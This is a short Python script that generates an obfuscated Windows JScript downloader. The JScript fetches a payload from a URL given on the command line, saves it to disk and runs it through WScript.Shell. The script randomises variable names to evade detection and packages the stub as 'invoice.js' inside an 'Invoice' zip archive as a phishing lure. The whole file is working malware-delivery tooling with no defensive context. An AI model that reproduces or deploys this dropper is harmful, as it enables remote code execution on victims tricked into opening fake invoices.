#!/usr/bin/python3

import sys, os, base64
from zipfile import ZipFile

basicStub = '''var url = "http://URLPATH/PAYLOADNAME"
var Tally = WScript.CreateObject('MSXML2.XMLHTTP');
Tally.Open('GET', url, false);
Tally.Send();
if (Tally.Status == 200)
{
var stream = WScript.CreateObject('ADODB.Stream');
stream.Open();
stream.Type = 1;
stream.Write(Tally.ResponseBody);
stream.Position = 0;
}
stream.SaveToFile("PAYLOADNAME", 2);
stream.Close();
var reap = new ActiveXObject("WScript.Shell").Run("PAYLOADNAME");'''

def shift():
    basic = base64.b64encode(os.urandom(6)[:6]).decode()
    return basic.replace("+", "k").replace("/", "F").replace("-", "T")
def stubgen(stub):
    obfuscatedStub = stub.replace("PAYLOADNAME", sys.argv[2]).replace("URLPATH", sys.argv[1]).replace("Tally", shift()).replace("reap", shift()).replace("url", shift()).replace("stream", shift())
    f = open(f"invoice.js","w+")
    f.write(obfuscatedStub)
    f.close

def zipper():
    stubgen(basicStub)
    zipObj = ZipFile(f"Invoice-{shift()}.zip", "w")
    zipObj.write("invoice.js")
    zipObj.close()
    os.remove("invoice.js")

def argchecker(argument):
    if len(argument) > 3 and sys.argv[3] == "zip":
        zipper()
    else:
        stubgen(basicStub)

argchecker(sys.argv)
